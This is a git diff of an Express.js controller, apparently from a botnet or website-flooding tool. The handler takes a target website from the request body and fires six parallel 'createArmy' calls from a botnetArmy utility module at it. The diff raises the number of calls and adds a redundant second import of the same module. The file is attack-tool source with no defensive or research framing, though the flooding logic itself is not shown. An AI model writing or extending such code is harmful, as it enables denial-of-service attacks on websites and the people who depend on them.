@@ -1,4 +1,5 @@
 import {Request, Response, NextFunction} from 'express'
+import botnetArmy from '../utils/botnetArmy'
 import botnet from '../utils/botnetArmy'
 
 class ControlControllers {
@@ -17,11 +18,12 @@ class ControlControllers {
             const {websiteTarget} = req.body
 
             await Promise.all([
-                botnet.createArmy(websiteTarget, 'Test'),  // 1
-                botnet.createArmy(websiteTarget, 'Test'),  // 2
-                botnet.createArmy(websiteTarget, 'Test'),  // 3
-                botnet.createArmy(websiteTarget, 'Test'),  // 4
-                botnet.createArmy(websiteTarget, 'Test'),  // 5
+               botnetArmy.createArmy(websiteTarget, 6, 15),
+               botnetArmy.createArmy(websiteTarget, 6, 15),
+               botnetArmy.createArmy(websiteTarget, 6, 15),
+               botnetArmy.createArmy(websiteTarget, 6, 15),
+               botnetArmy.createArmy(websiteTarget, 6, 15),
+               botnetArmy.createArmy(websiteTarget, 6, 15)
             ])
 
             res.status(200).json({
